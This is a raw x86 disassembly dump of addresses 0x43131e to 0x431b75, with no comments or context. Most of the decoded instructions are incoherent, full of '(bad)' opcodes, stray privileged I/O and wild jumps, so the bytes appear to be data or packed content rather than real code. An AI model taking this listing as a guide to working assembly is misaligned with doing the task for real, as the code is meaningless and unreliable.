  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
